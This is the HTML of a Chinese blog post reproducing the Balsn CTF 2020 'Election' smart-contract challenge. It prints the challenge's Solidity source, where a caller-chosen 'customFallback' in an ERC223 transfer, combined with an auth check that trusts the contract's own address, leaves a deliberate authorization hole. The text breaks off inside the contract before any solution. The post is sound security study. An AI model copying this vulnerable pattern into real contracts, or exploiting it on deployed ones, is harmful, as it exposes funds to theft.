@@ -1,0 +1,1549 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="Balsn CTF 2020 - ElectionRetr_0师傅这周准备复现2020 Balsn的智能合约赛题，我也跟着学习一波。 Balsn出品，必属精品。作者的wp。 Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
+<meta name="keywords" content="Blockchian CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Balsn CTF 2020 - Election 复现笔记">
+<meta property="og:url" content="https://ainevsia.github.io/2021/04/07/BalsnCTF2020-Election/index.html">
+<meta property="og:site_name" content="无花果">
+<meta property="og:description" content="Balsn CTF 2020 - ElectionRetr_0师傅这周准备复现2020 Balsn的智能合约赛题，我也跟着学习一波。 Balsn出品，必属精品。作者的wp。 Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-04-07T08:14:47.613Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Balsn CTF 2020 - Election 复现笔记">
+<meta name="twitter:description" content="Balsn CTF 2020 - ElectionRetr_0师傅这周准备复现2020 Balsn的智能合约赛题，我也跟着学习一波。 Balsn出品，必属精品。作者的wp。 Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="无花果" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://ainevsia.github.io/2021/04/07/BalsnCTF2020-Election/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Balsn CTF 2020 - Election 复现笔记 | 无花果</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">无花果</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">浊以静之徐清，安以动之徐生。</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+  
+  
+
+  
+
+  <a href="https://github.com/ainevsia" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ainevsia.github.io/2021/04/07/BalsnCTF2020-Election/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ainevsia">
+      <meta itemprop="description" content="Personal Blog">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/31178818?s=400&u=04fe60fc9fd9e159806f4c2363ab9a4da748bf84&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="无花果">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Balsn CTF 2020 - Election 复现笔记
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021年04月07日 15:41:06 / 修改时间：16:14:47" itemprop="dateCreated datePublished" datetime="2021-04-07T15:41:06+08:00">2021年04月07日</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/2021/04/07/BalsnCTF2020-Election/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/04/07/BalsnCTF2020-Election/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">14k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">13 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Balsn-CTF-2020-Election"><a href="#Balsn-CTF-2020-Election" class="headerlink" title="Balsn CTF 2020 - Election"></a>Balsn CTF 2020 - Election</h1><p><a href="http://zhaobairen.club/" target="_blank" rel="noopener">Retr_0</a>师傅这周准备复现2020 Balsn的智能合约赛题，我也跟着学习一波。</p>
+<p>Balsn出品，必属精品。作者的<a href="https://x9453.github.io/2021/02/27/Balsn-CTF-2020-Election/" target="_blank" rel="noopener">wp</a>。</p>
+<h1 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">interface IERC223 &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">string memory</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">symbol</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">string memory</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">decimals</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint8</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">totalSupply</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">balanceOf</span>(<span class="params">address account</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value, bytes memory data</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value, bytes memory data, string memory customFallback</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">    <span class="title">event</span> <span class="title">Transfer</span>(<span class="params">address indexed from, address indexed to, uint value, bytes data</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">ERC223</span> <span class="title">is</span> <span class="title">IERC223</span> </span>&#123;</span><br><span class="line">    string public override name;                    <span class="comment">// 0</span></span><br><span class="line">    string public override symbol;                  <span class="comment">// 1</span></span><br><span class="line">    uint8 public override decimals;                 <span class="comment">// 2</span></span><br><span class="line">    uint public override totalSupply;               <span class="comment">// 3</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) private _balances;    <span class="comment">// 4</span></span><br><span class="line">    string private constant _tokenFallback = <span class="string">"tokenFallback(address,uint256,bytes)"</span>;    <span class="comment">// opt out</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span> (string memory _name, string memory _symbol) public &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        symbol = _symbol;</span><br><span class="line">        decimals = <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address account</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value</span>) <span class="title">public</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _transfer(msg.sender, to, value, <span class="string">""</span>, _tokenFallback);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value, bytes memory data</span>) <span class="title">public</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _transfer(msg.sender, to, value, data, _tokenFallback);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value, bytes memory data, string memory customFallback</span>) <span class="title">public</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _transfer(msg.sender, to, value, data, customFallback);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Helper functions */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_transfer</span>(<span class="params">address from, address to, uint value, bytes memory data, string memory customFallback</span>) <span class="title">internal</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="keyword">from</span> != address(<span class="number">0</span>), <span class="string">"ERC223: transfer from the zero address"</span>);</span><br><span class="line">        <span class="built_in">require</span>(to != address(<span class="number">0</span>), <span class="string">"ERC223: transfer to the zero address"</span>);</span><br><span class="line">        <span class="built_in">require</span>(_balances[<span class="keyword">from</span>] &gt;= value, <span class="string">"ERC223: transfer amount exceeds balance"</span>);</span><br><span class="line">        _balances[<span class="keyword">from</span>] -= value;</span><br><span class="line">        _balances[to] += value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_isContract(to)) &#123;  <span class="comment">// to : this</span></span><br><span class="line">            (bool success,) = to.call&#123;<span class="attr">value</span>: <span class="number">0</span>&#125;(</span><br><span class="line">                abi.encodeWithSignature(customFallback, msg.sender, value, data)</span><br><span class="line">            );</span><br><span class="line">            assert(success);</span><br><span class="line">        &#125;</span><br><span class="line">        emit Transfer(msg.sender, to, value, data);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_mint</span>(<span class="params">address to, uint value</span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(to != address(<span class="number">0</span>), <span class="string">"ERC223: mint to the zero address"</span>);</span><br><span class="line">        totalSupply += value;</span><br><span class="line">        _balances[to] += value;</span><br><span class="line">        emit Transfer(address(<span class="number">0</span>), to, value, <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_isContract</span>(<span class="params">address addr</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            length := extcodesize(addr)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (length &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Election is ERC223 &#123;</span><br><span class="line">    struct Proposal &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        bool valid;</span><br><span class="line">    &#125;</span><br><span class="line">    struct Ballot &#123;</span><br><span class="line">        address candidate;</span><br><span class="line">        uint votes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint randomNumber = RN;         <span class="comment">// 5</span></span><br><span class="line">    bool public sendFlag = <span class="literal">false</span>;   <span class="comment">// 6_0_1</span></span><br><span class="line">    address public owner;           <span class="comment">// 6_1_21</span></span><br><span class="line">    uint public stage;              <span class="comment">// 7</span></span><br><span class="line">    address[] public candidates;    <span class="comment">// 8</span></span><br><span class="line">    bytes32[] public voteHashes;    <span class="comment">// 9</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> Proposal) public proposals;  <span class="comment">// 10</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public voteCount;      <span class="comment">// 11</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> bool) public voted;          <span class="comment">// 12</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> bool) public revealed;       <span class="comment">// 13</span></span><br><span class="line"></span><br><span class="line">    event Propose(address, Proposal);</span><br><span class="line">    event Vote(bytes32);</span><br><span class="line">    event Reveal(uint, Ballot[]);</span><br><span class="line">    event SendFlag(address);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() public ERC223("Election", "ELC") &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        _setup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier auth &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == address(<span class="keyword">this</span>) || msg.sender == owner, <span class="string">"Election: not authorized"</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">propose</span>(<span class="params">address candidate, Proposal memory proposal</span>) <span class="title">public</span> <span class="title">auth</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(stage == <span class="number">0</span>, <span class="string">"Election: stage incorrect"</span>);</span><br><span class="line">        <span class="built_in">require</span>(!proposals[candidate].valid, <span class="string">"Election: candidate already proposed"</span>);</span><br><span class="line">        candidates.push(candidate);</span><br><span class="line">        proposals[candidate] = proposal;</span><br><span class="line">        emit Propose(candidate, proposal);</span><br><span class="line">        <span class="keyword">return</span> candidates.length - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vote</span>(<span class="params">bytes32 voteHash</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(stage == <span class="number">1</span>, <span class="string">"Election: stage incorrect"</span>);</span><br><span class="line">        <span class="built_in">require</span>(!voted[msg.sender], <span class="string">"Election: already voted"</span>);</span><br><span class="line">        voted[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">        voteHashes.push(voteHash);</span><br><span class="line">        emit Vote(voteHash);</span><br><span class="line">        <span class="keyword">return</span> voteHashes.length - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reveal</span>(<span class="params">uint voteHashID, Ballot[] memory ballots</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(stage == <span class="number">2</span>, <span class="string">"Election: stage incorrect"</span>);</span><br><span class="line">        <span class="built_in">require</span>(!revealed[msg.sender], <span class="string">"Election: already revealed"</span>);</span><br><span class="line">        <span class="built_in">require</span>(voteHashes[voteHashID] == keccak256(abi.encode(ballots)), <span class="string">"Election: hash incorrect"</span>);</span><br><span class="line">        revealed[msg.sender] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        uint totalVotes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; ballots.length; i++) &#123;</span><br><span class="line">            address candidate = ballots[i].candidate;</span><br><span class="line">            uint votes = ballots[i].votes;</span><br><span class="line">            totalVotes += votes;</span><br><span class="line">            voteCount[candidate] += votes;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">require</span>(totalVotes &lt;= balanceOf(msg.sender), <span class="string">"Election: insufficient tokens"</span>);</span><br><span class="line">        emit Reveal(voteHashID, ballots);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getWinner</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(stage == <span class="number">3</span>, <span class="string">"Election: stage incorrect"</span>);</span><br><span class="line">        uint maxVotes = <span class="number">0</span>;</span><br><span class="line">        address winner = address(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (voteCount[candidates[i]] &gt; maxVotes) &#123;</span><br><span class="line">                maxVotes = voteCount[candidates[i]];</span><br><span class="line">                winner = candidates[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> winner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">giveMeMoney</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf(msg.sender) == <span class="number">0</span>, <span class="string">"Election: you're too greedy"</span>);</span><br><span class="line">        _mint(msg.sender, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">giveMeFlag</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == getWinner(), <span class="string">"Election: you're not the winner"</span>);</span><br><span class="line">        <span class="built_in">require</span>(proposals[msg.sender].valid, <span class="string">"Election: no proposal from candidate"</span>);</span><br><span class="line">        <span class="keyword">if</span> (_stringCompare(proposals[msg.sender].policies, <span class="string">"Give me the flag, please"</span>)) &#123;</span><br><span class="line">            sendFlag = <span class="literal">true</span>;</span><br><span class="line">            emit SendFlag(msg.sender);</span><br><span class="line">        